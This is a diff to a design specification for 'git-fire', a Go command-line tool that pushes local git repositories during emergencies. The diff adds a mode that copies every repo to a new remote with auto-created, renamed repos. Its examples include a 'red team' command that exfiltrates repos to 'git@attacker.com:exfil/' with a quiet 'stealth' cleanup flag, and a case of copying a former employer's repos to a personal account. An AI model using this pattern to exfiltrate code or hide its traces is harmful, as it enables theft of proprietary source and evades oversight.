@@ -25,12 +25,15 @@ github.com/spf13/viper v1.18.0              // Config loading
 ### Primary Flow
 
 ```
-User runs: git-fire
+User runs: git-fire [--backup-to <remote>]
     ↓
 [PROMPT SCREEN] "Is the building on fire?"
     ├─→ YES → [SCAN] → [DRY RUN] → [PUSH] → [REPORT]
     ├─→ NO → [EXIT]
     └─→ FIRE DRILL → [SCAN] → [DRY RUN REPORT] → [EXIT]
+
+Mode A: Normal Fire (push to existing remotes)
+Mode B: Backup to New Remote (push to new location, auto-create repos)
 ```
 
 #### Step 1: Prompt Screen (10-second timeout)
@@ -91,6 +94,57 @@ User runs: git-fire
 
 ---
 
+### Backup to New Remote Mode
+
+**Use Cases:**
+1. **Emergency backup:** GitHub/GitLab down, backup to alternative server
+2. **Account migration:** Leaving company, clone all repos to personal account
+3. **Disaster recovery:** Infrastructure compromised, backup to safe location
+4. **Red team/pentesting:** Exfiltrate repos during authorized assessment
+
+**Invocation:**
+```bash
+git-fire --backup-to <git-root-url> --token <api-token>
+```
+
+#### Additional Steps for Backup Mode:
+
+**Step 2B: Repository Renaming (after scanning)**
+- For each discovered repo, generate new name using template
+- Template variables: `{hostname}`, `{username}`, `{repo_name}`, `{date}`, `{time}`
+- Default: `{hostname}-{repo_name}`
+- Examples:
+  - Original: `company-app`
+  - New: `victimbox-company-app`
+  - Or: `company-app-backup-20260212`
+
+**Step 4C: Backup Push (instead of normal push)**
+- For each repo:
+  1. Auto-commit uncommitted changes (same as normal mode)
+  2. Generate new repo name from template
+  3. Auto-create repo on target server (GitHub/GitLab/Gitea API)
+  4. Add new remote: `git remote add backup <new-repo-url>`
+  5. Push all branches: `git push backup --all`
+  6. Push all tags: `git push backup --tags`
+  7. **Keep new remote** (unless `--cleanup-after` flag)
+  8. Log success/failure
+
+**Step 5B: Backup Completion Report**
+- Summary: repos backed up, repos created on target
+- New remote locations (URLs)
+- Failed backups (if any)
+- Manifest file location (JSON with all backup metadata)
+- Total time elapsed
+
+**Behavior Differences from Normal Mode:**
+- Push to NEW remote location (not existing remotes)
+- Auto-create repos on target (requires API token)
+- Rename repos to avoid conflicts
+- Add new remote to each repo (keeps original remotes intact)
+- Generate manifest file with backup metadata
+
+---
+
 ## Configuration Specification
 
 ### File Location
@@ -120,6 +174,43 @@ push_to_all_remotes = true
 
 # Preferred remote order if push_to_all_remotes = false
 preferred_remotes = ["origin", "backup", "upstream"]
+
+# Backup to new remote configuration
+[backup]
+# Target git server root URL (empty = disabled)
+# Examples:
+#   git@github.com:username/
+#   https://gitlab.com/username/
+#   git@gitea.server.com:backup/
+#   /mnt/usb/git-backup/  (local filesystem)
+target_remote = ""
+
+# Platform type for API calls (github, gitlab, gitea, gogs, none)
+platform = "github"
+
+# API token (use env var GIT_FIRE_BACKUP_TOKEN instead of storing here)
+api_token_env = "GIT_FIRE_BACKUP_TOKEN"
+
+# Repo naming template
+# Variables: {hostname}, {username}, {repo_name}, {date}, {time}, {path_hash}
+repo_name_template = "{hostname}-{repo_name}"
+prefix = ""  # Alternative to template
+suffix = ""  # Alternative to template
+
+# Remote name to add to each repo after successful push
+remote_name = "backup"
+
+# Auto-create repos on target (requires API token + platform support)
+auto_create_repos = true
+
+# Keep new remote after push (recommended: true for safety)
+keep_remote_after_push = true
+
+# Cleanup mode (remove new remote after push - for stealth/red team)
+cleanup_after = false
+
+# Make auto-created repos private (recommended: true)
+create_private_repos = true
 
 # Filesystem scan settings (hybrid strategy)
 # Quick scan paths (checked first, < 5 seconds)
@@ -294,7 +385,58 @@ type Config struct {
     Global      GlobalConfig
     Auth        AuthConfig
     Logging     LoggingConfig
+    Backup      BackupConfig
     Repos       []RepoOverride
+}
+
+// BackupConfig for backup-to-new-remote mode
+type BackupConfig struct {
+    TargetRemote        string            // git@github.com:user/ or /mnt/usb/backup/
+    Platform            string            // github, gitlab, gitea, gogs, none
+    APITokenEnv         string            // Env var name for token
+    RepoNameTemplate    string            // Template for renamed repos
+    Prefix              string            // Repo name prefix
+    Suffix              string            // Repo name suffix
+    RemoteName          string            // Name of new remote to add
+    AutoCreateRepos     bool              // Auto-create via API
+    KeepRemoteAfterPush bool              // Keep new remote (true) or cleanup (false)
+    CleanupAfter        bool              // Stealth mode - remove remote after push
+    CreatePrivateRepos  bool              // Make created repos private
+}
+
+// BackupManifest is the metadata file generated during backup mode
+type BackupManifest struct {
+    Hostname     string              // System hostname
+    Username     string              // Current user
+    Timestamp    time.Time           // When backup ran
+    TargetRemote string              // Where repos were backed up to
+    Repos        []BackupRepoInfo    // Info about each backed up repo
+    Summary      BackupSummary       // Overall stats
+}
+
+// BackupRepoInfo describes a single backed up repo
+type BackupRepoInfo struct {
+    OriginalPath      string   // Original filesystem path
+    OriginalName      string   // Original repo name
+    BackupName        string   // New name on backup server
+    BackupURL         string   // Full URL of backed up repo
+    Branches          []string // Branches pushed
+    Tags              []string // Tags pushed
+    TotalCommits      int      // Approximate commit count
+    UncommittedFiles  bool     // Had uncommitted changes (auto-committed)
+    OriginalRemotes   []string // Original remote names
+    BackupSuccess     bool     // Whether backup succeeded
+    BackupError       string   // Error message if failed
+}
+
+// BackupSummary provides overall stats
+type BackupSummary struct {
+    TotalRepos        int
+    SuccessfulBackups int
+    FailedBackups     int
+    TotalBranches     int
+    TotalTags         int
+    DurationSeconds   int
 }
 ```
 
@@ -342,11 +484,34 @@ git-fire/
 
 ```
 USAGE:
-  git-fire                   # Interactive mode (scan cached + quick paths)
+  git-fire                   # Interactive mode (normal fire - push to existing remotes)
   git-fire ~/projects        # Scan specific path
   git-fire /path/to/repo     # Scan single repo
+  git-fire --backup-to <url> # Backup mode (push to new remote location)
 
 FLAGS:
+
+BACKUP MODE:
+  --backup-to URL            Backup all repos to new remote location
+                             (enables backup mode instead of normal fire)
+
+  --token TOKEN              API token for auto-creating repos
+                             (or use GIT_FIRE_BACKUP_TOKEN env var)
+
+  --platform TYPE            Platform type: github, gitlab, gitea, gogs
+                             (default: auto-detect from URL)
+
+  --prefix PREFIX            Prefix for renamed repos (e.g., "backup-")
+
+  --suffix SUFFIX            Suffix for renamed repos (e.g., "-backup")
+
+  --remote-name NAME         Name for new remote (default: "backup")
+
+  --cleanup-after            Remove new remote after push (stealth mode)
+
+  --no-auto-create           Don't auto-create repos (must exist on target)
+
+GENERAL FLAGS:
   -c, --config FILE          Path to config file
                              (default: ~/.config/git-fire/config.toml)
 
@@ -430,6 +595,38 @@ $ git-fire --dry-run --quiet
 # Emergency alias (unlock SSH, then fire)
 $ alias emergency-fire='ssh-add ~/.ssh/id_rsa && git-fire'
 $ emergency-fire
+
+# ========== BACKUP TO NEW REMOTE MODE ==========
+
+# Emergency: GitHub down, backup to GitLab
+$ git-fire --backup-to git@gitlab.com:mybackup/ \
+           --token $GITLAB_TOKEN
+
+# Migration: Leaving company, clone repos to personal account
+$ git-fire --backup-to git@github.com:personal/ \
+           --token $PERSONAL_GITHUB_TOKEN \
+           --prefix "old-company-"
+
+# Red team: Exfiltrate repos (authorized pentest)
+$ git-fire --backup-to git@attacker.com:exfil/ \
+           --token $TOKEN \
+           --prefix "$(hostname)-" \
+           --cleanup-after \
+           --quiet
+
+# Forensics: Backup to USB drive (no network)
+$ git-fire --backup-to /mnt/usb/git-backup/ \
+           --prefix "incident-IR2026-"
+
+# Disaster recovery: Company server compromised
+$ git-fire --backup-to git@safe-backup.com:emergency/ \
+           --token $BACKUP_TOKEN \
+           --suffix "-recovery"
+
+# With custom repo naming
+$ git-fire --backup-to git@github.com:backup/ \
+           --token $TOKEN \
+           --prefix "$(hostname)-$(whoami)-"
 ```
 
 ---
@@ -1137,9 +1334,15 @@ func PushBranch(repoPath, remoteName, branchName string) error {
 6. Conflict detection
 7. Panic mode push execution with real-time UI
 8. New branch creation on conflicts
-9. Structured logging to file
-10. Completion report
-11. Cross-platform binary (macOS, Linux)
+9. **Backup to new remote mode:**
+   - Auto-create repos on target (GitHub/GitLab/Gitea API)
+   - Repo renaming with templates
+   - Add new remote to repos
+   - Generate backup manifest
+10. SSH passphrase handling
+11. Structured logging to file
+12. Completion report
+13. Cross-platform binary (macOS, Linux)
 
 ### Nice-to-Have (Phase 2)
 - Windows support
